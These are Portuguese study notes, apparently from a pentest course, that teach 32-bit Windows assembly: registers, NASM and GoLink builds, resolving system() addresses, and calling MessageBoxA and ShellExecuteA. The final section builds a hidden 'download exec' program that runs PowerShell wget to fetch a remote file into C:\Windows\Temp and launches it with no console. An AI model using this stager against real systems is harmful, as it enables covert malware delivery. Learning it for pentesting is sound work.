

# Introdução a Assembly

Nesse módulo aprenderemos o básico do Assembly para que seja possível no futuro ir evoluindo conforme as necessidades do pentest.

Sem esse conhecimento básico em dado momento será impossível evoluir em Pentest

**Assembly** —> Código que permite nossa comunicação com a linguagem de máquinas

### Arquitetura de componentes:

Toda máquina deve ter no mínimo

- CPU
- Memória RAM
- Placa mãe
- Fonte de Energia

Para essa introdução avançaremos um pouco nesses itens

### CPU

- Cérebro do computador
- Responsável por operações lógicas e processar dados
- Cada CPU tem seu conjunto de `registradores` que conforme veremos a seguir são chave para a programação em Assembly]

### Registradores

- Pequena unidade de memória que armazena instruções e reage de acordo com seu tipo
- Cada CPU terá seu conjunto de registradores
- Exemplo: `eax,ebx,ecx`
- Ler documentação para entender qual a utilidade de cada registrador em uma função utilizada

### Memória

- Após a execução de um processo ele é armazenado na memória


----




# Principais ferramentas no estudo de Assembly

Antes de começarmos as configurações alguns conceitos chaves devem ser entendidos

`Compilador` : Em Assembly precisaremos de compiladores que transformam nosso código ASM em propriamente um arquivo executável

`Descompilador` : Da mesma forma é importante que seja possível para o pentester pegar um arquivo executável e descompila-lo para ASM para entender seu funcionamento

`arwin.exe <Library Name> <Function Name>` : Utilitário que permite verificar DLL utilizada pela função. EX: `arwin msvcrt system`

`nasm.exe -f win32/64 <código>.asm` : Compilador de arquivo ASM para .obj

`objdump -d -M intel código.obj` : Dessasembly do código

`GoLink.exe /console /entry _main <código>.obj <dll encontrada>` : Compilador do arquivo .obj para executável

_Para arquivos ASM eles podem ser criado no bloco de notas_

**`Immunity Debugger`** : Debugger que utilizaremos para entender com certeza o que está ocorrendo em nosso executável

`fn+F7` —> Próximo passo

`Debug>Arguments` —> Passa argumento do código

`Breakpoint` —> Bota parada na execução do programa em momento especifico

`New origin here` —> Inicia programa a partir de certo ponto

`Follow in dump` —> Vê conteúdo que está armazenado em hexa da chamada



----





# Assembly para Pentesters (Básico)

Seguindo na teoria é importante repassarmos a introdução da linguagem utilizada no Assembly, para essa linguagem existem dois padrões

**Intel x AtDt**

- Intel: `mov eax, 3` (Esquerda pra direita)
    
- AtDt: `movl $0x3, %eax` (Direita pra esquerda)
    
    - $ - números
    - % - registradores
    
    (Nos dois cenários estamos enviando 3 para o registrador eax)
    

### Instruções básicas para código Assembly

- `Mov` : Move item a registrador
    
- `Add` : Adiciona valor a registrador
    
- `Sub` : Subtrai valor de registrador
    
- `Inc`: Incrementa valor em registrador
    
- `Dec` : Decrementa valor de registrador
    
- `Call` : Realizada chamada de registrador
    
- `Jmp` : Realiza pulo para registrador solicitado
    
    - `Je` : Jump Equal
    - `Jne` : Jump not Equal
- `Cmp` : Compara dois registradores
    
- `Push` : Põe registrador no topo da stack
    
- `Pop` : Retira registrador do topo da stack
    
- `Nop`: NO operation
    
- `Int3` : Interrupção
    
- `ESP` : Registrador que aponta sempre para o próximo passo na stack
    



-----





# Praticando com Assembly e primeiro código

Nesse tópico entendermos o começo da criação de um código em Assembly e com isso criaremos o primeiro código, que servirá de corpo para os próximos.

### Estrutura básica

```bash
global _main
section .txt

_main: 
    NOP ;Não faz nada
    NOP
    NOP
    MOV eax, 41424344 ;Registrador EAX recebe 41424344 ABCD ao contrário 
    MOV ebx, 3 
    ADD eax, ebx ;Adiciona valor de eax a ebx
    JMP <endereço de memória a ir>
    
    
```

**Perceba que as indentações são feitas com 4 espaços**

### Criação de código

```bash
nasm -f win32 primeiro.asm --> Cria OBJ
objdump -d -M intel primeiro.obj --> Dissasembly
golink /entry _main codigo.obj --> Cria exe
```


----






# Programando em Assembly (Sleep)

Nesse item observaremos o passo a passo para utilizar a função sleep em um código Assembly

1. Como primeiro item a ser feito precisamos criar o código em C com a função desejada. Nesse caso a função sleep.
    
    Pesquisando criei o seguinte código em C
    
    ```bash
    #include <Windows.h>
    
    int main() {
      int i=0;
    
      while (i++ < 10) {
          Sleep(500); // Sleep 0,5 segundo
      }
    
      return 0;
    }
    ```
    
2. Com o código em C criado e executável abre ele no debugger para entender o que ocorre.
    
    ![[Pasted image 20251119223129.png]]
    
    De acordo com o Debugger a função Sleep tem como DLL —> KERNEL32
    
    Perceba que no item sublinhado temos a função Sleep sendo chamada, usando o `New origin here` e `fn+F7` na linha Call conseguimos pular para a função e achar seu endereço de memória.
    
    ![[Pasted image 20251119223141.png]]
    
    Com isso descobrimos que o endereço buscado é 76BFD720
    
1. Para confirmar essa informação como passo adicional utilizaremos o **arwin.exe** para validar o endereço
    
    `arwin.exe KERNEL32 Sleep`
    
![[Pasted image 20251119223152.png]]
    
    CONFIRMADO!!!
    
2. Confirmando a DLL a ser utilizada pelo Assembly seguiremos agora para construção do código. Para iniciar é recomendado sempre utilizar a estrutura primária.
    
    O código pode ser feito no bloco de notas normalmente.
    
    ```bash
    global _main
    section .text
    
    _main: 
        xor eax, eax ;Limpeza do registrador eax
        mov eax, 9000 ;Alocação do valor 9000 (nove segundos) de valor da fun
        push eax ;Alocação de eax no topo da stack
        mov ebx 0x76BFD720 ;ebx recebe valor do endereço da DLL para poder chamar sleep
        call ebx ;Chamada da função sleep
        
    ```
    
3. Criado o arquivo .ASM basta agora rodar os compiladores corretos para finalizar o código Assembly
    
    ```bash
    nasm -f win32 <código>.asm
    golink /entry _main <codigo>.obj KERNEL32
    ```
    



----





# Executando no CMD via código Assembly

Antes de iniciarmos essa sessão é importantíssimo que entendamos algumas regras que devem ser seguidos para passar comandos ao buffer via código Assembly.

- **Todos os comandos passados devem ser feitos de trás pra frente pela lógica de pilha**
    
    `Ascii —> Hexadecimal —> Resultado na pilha`
    
    `abcd —> 414243 —> dcba`
    
    `.exe —> 2f657865 —> exe.`
    
    `exe. —> 6578652e —> .exe`
    
- Para fazer a inversão perceba que são invertidos os bytes em **DUPLAS**
    
- Ao final do comando sempre deve ser adicionado 00 como bytes finais, independentemente de qualquer coisa
    
- ANTES de inverter os bytes dos comandos divida as duplas em grupos de 4, essa ordem deve ser invertida também
    
    Exemplo:
    
    ```bash
    Comando: cmd.exe /c calc.exe
    cmd. : 63 6d 64 2e
    exe  : 65 78 65 00
    
    (Inversão de ordem e bits)
    
    00657865 --> exe
    2e646d63 --> cmd.
    (4 caracteres contando os espaços)
    (Perceba que com os espaços temos grupos de 4)
    ```
    
- Seguindo com o processo devemos a seguir encontrar a DLL necessária para fazer a chamada do código, conforme já vimos na sessão anterior. Para isso criamos um código exemplo em C:
    
    ```bash
    #include <Windows.h>
    
    int main(){
    	system("cmd.exe");
    	
    }
    ```
    
- Compile, rode e abra no Assembly para encontrar a DLL, perceba abaixo que quando encontramos a chamada basta segui-la para encontrar o endereço desejado.
    

![[Pasted image 20251119223315.png]]

![[Pasted image 20251119223322.png]]

~={orange}DLL = SHELL32

~={orange}(FN+F7) + (FN+F7) na chamada tu acha o print 2 com o endereço = 76e250a0=~=~

- Verifique o encontrado com arwin:
    
    ![[Pasted image 20251119223339.png]]
    
- Seguindo o processo agora com o comando corretamente traduzido construiremos o código Assembly utilizando a base que temos até agora, repare no código completo abaixo:
    
    ```bash
    global _main
    
    section .text
    
    _main:
    	push 0x00657865 ;exe
    	push 0x2e646d63 ;cmd.
    	push esp ; Apontamento pro topo da stack
    	pop eax  ; Retirada de conteúdo de eax
    	push eax ; Envio de comando ao registro eax
    	mov ebx, 0x76e250a0 ; Envia system pro ebx
    	call ebx ; Chamada da system
    	
    
    ```
    *0x --> Explicita que é hexadecimal
    
- Para finalizar basta rodar os comandos de compilação necessário e rodar o programa
    
    ```bash
    nasm.exe -f win32 .\\cmdexe.asm
    GoLink.exe /console /entry _main cmdexe.obj msvcert
    ```
    




----





# DESAFIO: Calculadora

Resumo rápido do que foi feito:

1. Construção de código em C pra achar DLL
    
    ```bash
    #include <Windows.h>
    
    int main(){
    	system("cmd.exe /c calc.exe");
    	
    }
    ```
    
2. Colocar ele no debugger (Tem que ter rodado o programa em C como 32bit)
    
    ```bash
    	Procura DLL utilizada
    	*Clica com o direito onde quer ir e usa new origin here*
    	*Você pode clicar no comando e la embaixo clica novamente, vai ter follow value in dump pra ver conteudo*
    	Olhando ja da pra ver que abaixo do comando tem system(função system) em conjunto com uma linha, marcando a chamada da função
    	0040150E  |. C70424 0040400>MOV DWORD PTR SS:[ESP],1.00404000                             ; |ASCII "cmd.exe /c calc.exe"
    	00401515  |. E8 DE100000    CALL <JMP.&msvcrt.system>                                     ; \\system
    	Dessa forma achei a DLL usada pra chamar a função --> msvcrt.dll
    	
    	Pra achar a o endereço em que está a system é um pouco mais complexto
    	Precisa botar para partir da linha que tem a CALL pra system e dar 1 F7 pra entrar nas chamadas
    	E depois +1 F7 pra entrar na chamada
    	770E50A0 > 8BFF             MOV EDI,EDI                                                   ; 1.<ModuleEntryPoint>
    	770E50A2   55               PUSH EBP
    	--> 770E50A0
    ```
    
3. Usar arwin para validar endereço encontrado…
    
    ```bash
    	arwin msvcrt system
    ```
    
4. Descobrir como é o comando em hexadecimal para por no assembly e adicionar 00 no final
    
    ```bash
    *Lembre que os agrupementos devem ser feitos em duplas de 4, caso sobre vá adicionando 00 no final
    *Pelo menos 1 00 deve ser adicionado
    *A ordem deve ser invertida para entendimento do assembly (pilha)
    *Espaço em hexa --> 20
    
    Comando: cmd.exe /c calc.exe
    cmd. : 63 6d 64 2e
    exe  : 65 78 65 20
    /c   : 2f 63 20 20 
    calc : 63 61 6c 63
    .exe : 2e 65 78 65
    00   : 00 00 00 00 
    (Ordem certa)
    
    (Inversão de ordem e bits)
    
    00000000 --> 00
    6578652e --> .exe
    636c6163 --> calc
    2020632f --> /c
    20657865 --> exe
    2e646d63 --> cmd.
    (4 caracteres contando os espaços)
    (Perceba que com os espaços temos grupos de 4)
    ```
    
5. Cria código Assembly básico enviando comandos listados
    
    ```bash
    global _main
    
    section .text
    
    _main:
    	push 0x00000000 ;0000
    	push 0x6578652e ;.exe
    	push 0x636c6163 ;calc
    	push 0x2020632f ;/c  
    	push 0x20657865 ;exe
    	push 0x2e646d63 ;cmd.
    	push esp ; Apontamento pro topo da stack
    	pop eax  ; Retirada de conteúdo de eax
    	push eax ; Envio de comando ao registro eax
    	mov ebx, 0x770E50A0 ; Envia system pro ebx
    	call ebx ; Chamada da system
    
    *0x --> Explicita que é hexadecimal
    ```
    
6. Roda compilação do Assembly
    

```bash
Tipo: .ASM
nasm.exe -f win32 <código>.asm
GoLink.exe /console /entry _main <código>.obj <dll encontrada>
Nesse caso --> GoLink.exe /console /entry _main 3.obj msvcrt.dll
```



----




# API do Assemble

Para essa sessão entenderemos como utilizar algo que simplifica demais a construção de código em Assembly: As APIs Com elas podemos fazer chamadas exportando itens para o código, fazendo não ser necessário encontrar endereços de DLLs.

Exemplo simples de construção de código Assembly:

1. Primeiramente encontramos qual a API a ser chamada, nesse caso queremos uma API de criação de Box de alerta na tela —> [https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox)
    
2. Fazendo a leitura da API é possível entender quais valores devem ser passados na chamada da mesma (fase crucial do processo)
    
    ```bash
    int MessageBox(
      [in, optional] HWND    hWnd,
      [in, optional] LPCTSTR lpText,
      [in, optional] LPCTSTR lpCaption,
      [in]           UINT    uType
    );
    ```
    
3. Começando o código em Assembly chamaremos a função padrão no inicio do arquivo
    
4. Adicione ao arquivo variáveis com a sessão de data
    
    ```bash
    section .data
        msg db "texto", 0
        titulo db "titulo", 0
    ```
    
5. Seguindo para a confecção do corpo do código lembre que as chamadas devem ser feitas de trás pra frente
    
    ```bash
    extern MessageBoxA 
    global _main
    
    section .data use32  ; Adicione 'use32' para garantir compatibilidade
        msg db "Mensagem", 0   
        titulo db "titulo", 0    
    
    section .text
    _main:
        push 0              ; uType (0 = MB_OK)
        push titulo         ; lpCaption (título da janela)
        push msg            ; lpText (mensagem)
        push 0              ; hWnd (NULL = sem janela pai)
        call MessageBoxA    ; Chama a função corretamente
    
        ; Limpa a stack (4 argumentos * 4 bytes = 16)
        add esp, 16
    
        ; Encerra o programa
        xor eax, eax
        ret
    ```
    
6. Perceba que a na ordem dos itens a mensagem deveriam vir primeiro em relação ao titulo, mas como a ordem é invertida ocorre o contrário
    
7. Perceba da mesma forma que para a chamar a função bastou `call MessageBoxA`
    


----





# Shell Execute com Assebly no Windows

Partindo para o penúltimo código desse módulo usaremos os conceitos estudados anteriormente para criar via Assembly um executor de comandos utilizando a API ShellExecuteA.

Abaixo está o passo a passo para construção do código:

1. Inicie o processo pesquisando pela API desejada para entendermos seu funcionamento:
    
    ```bash
    	Sintaxe:
    	HINSTANCE ShellExecuteA(
    	  [in, optional] HWND   hwnd,
    	  [in, optional] LPCSTR lpOperation,
    	  [in]           LPCSTR lpFile,
    	  [in, optional] LPCSTR lpParameters,
    	  [in, optional] LPCSTR lpDirectory,
    	  [in]           INT    nShowCmd
    	);
    	
    No fim do doc aparece a DLL a ser usada
    ```
    
2. Para iniciar o código comece com a estrutura básica que repassamos + sessão de dados para criarmos variáveis
    
    ```bash
    	global _main
    
    	section .text
    	section .data
    
    	_main:
    ```
    
3. A seguir crie as variáveis necessárias solicitadas pela documentação da API
    
    ```bash
    	global _main
    
    	section .text
    	section .data
    		comando db "cmd.exe",0
    		tipo db "open",0
    
    	_main:
    ```
    
4. Adiciona a API no começo do código
    
    ```
    extern ShellExecuteA
    global _main
    
    section .text
    section .data
    	comando db "cmd.exe",0
    	tipo db "open",0
    
    _main:
    
    ```
    
5. Complete o main enviando os itens necessários para os registradores
    
    ```bash
    extern ShellExecuteA
    global _main
    
    section .data use32  ; Adicione 'use32' para garantir compatibilidade
       comando db "cmd.exe",0
       tipo db "open",0
    
    section .text
    _main:
        push 1          
        push 0      
        push 0       
        push comando             
        push tipo
        push 0
        call ShellExecuteA
    
        ; Limpa a stack (4 argumentos * 4 bytes = 16)
        add esp, 16
    
        ; Encerra o programa
        xor eax, eax
        ret
    ```
    
6. Finalize a criação salvando o arquivo como .ASM e rodando os compiladores necessários
    
    ```bash
    	DLL --> Shell32.dll
    	nasm -f win32 <objeto.asm>
    	golink /entry _main <objeto.obj> User32.dll /mix
    	
    	*Aqui removemos o console para o processo rodar em background
    ```
    



-----





# Criando Download Exec em Assembly

Como último código para Windows entendermos como criar um código Assembly que realiza download de outro arquivo e o executa remotamente, tudo por baixo dos panos.

Para isso exploraremos todos os nossos conhecimentos até agora…

***IMPORTANTE: Para essa lógica você deve ter entendido bem o módulo de Shell Execute…**

1. Comece entendendo como funcionará a chamada de um arquivo externo, e como fazer para chama-lo via CMD…
    
    ```bash
    1. Comando: wget para download externo
    2. Comando: Execução do arquivo buscando ele no sistema
    3. Aglomeração de comandos
    
    4. --> powershell -Command wget <site> -Outfile c:\\Windows\\Temp\\<arquivodentrodoalvo>
    	Perceba que já definimos onde o arquivo será alocado para execução logo depois
    5. --> powershell -Command c:\\Windows\\Temp\\<arquivodentrodoalvo>
    
    6. --> powershell -Command wget <site> -Outfile c:\\Windows\\Temp\\<arquivodentrodoalvo> ; c:\\Windows\\Temp\\<arquivodentrodoalvo>" 
    ```
    
2. Agora que entendemos como o processo deve ser feito manualmente podemos inicializar a criação do código em Assembly, para isso inicie nosso código de ShellExecute
    
    ```bash
    extern ShellExecuteA
    global _main
    
    section .data use32
     
    
    section .text
    _main:
    
        add esp, 24            ; limpa os 6 argumentos (6 * 4 = 24 bytes)
    
        xor eax, eax
        ret
    ```
    
3. Seguindo com a ideia do código agora construiremos o main tendo de base nosso código passado em ShellExecute e o que necessitamos fazer no passo 1
    
    ```bash
    extern ShellExecuteA
    global _main
    
    section .data use32
        comando db "powershell", 0
        operacao db "open", 0
        argumentos db "-Command wget <https://raw.githubusercontent.com/m4EDRE/hash/refs/heads/main/quebrahash.py?token=GHSAT0AAAAAADE7JJXKUZZ4XIWW6GG4IXIO2DKYEAA> -Outfile c:\\\\Windows\\\\Temp\\\\quebrash.py ; notepad.exe c:\\\\Windows\\\\Temp\\\\quebrash.py", 0
    
    section .text
    _main:
        xor eax, eax
    
        push 1                 ; nShowCmd = SW_SHOWNORMAL
        push 0                 ; lpDirectory = NULL
        push argumentos        ; lpParameters = argumentos
        push comando           ; lpFile = "powershell"
        push operacao          ; lpOperation = "open"
        push 0                 ; hwnd = NULL
        call ShellExecuteA
    
        add esp, 24            ; limpa os 6 argumentos (6 * 4 = 24 bytes)
    
        xor eax, eax
        ret
    ```
    
4. **`PULO DO GATO` —> Perceba que para o código funcionar o primeiro comando (powershell) deve ser passado como comando, mas o resto da função como argumentos**
    
5. Feito todos esse processo e revisado agora basta usar os compiladores necessários para que ele funcione.
    
    ```bash
    *Importante .data estar acima de .text que esta junto de _main
    *MUITO IMPORTANTE: Aqui perceba que a função pede 6 argumentos, e passamos 6 argumentos, eles precisam estar exatamente ao contrario porque cada um significa algo!!!!
    Ache na documentação a DLL utilizada e use o golink
    	
    	
    	DLL --> Shell32.dll
    	golink /entry _main <objeto.obj> User32.dll /mix
    	*Aqui removemos o console para o processo rodar em background
    	
    ```
    

# Monitoramento APIs do Windows

Junto com o pacote de Desec Tools passado pelo Longatto existe uma aplicação chamada de API monitor.

Com ela podemos explorar a chamada de APIs e visualizar elas sendo executadas.

Vale a pena pesquisar e observar como é o funcionamento desse programa…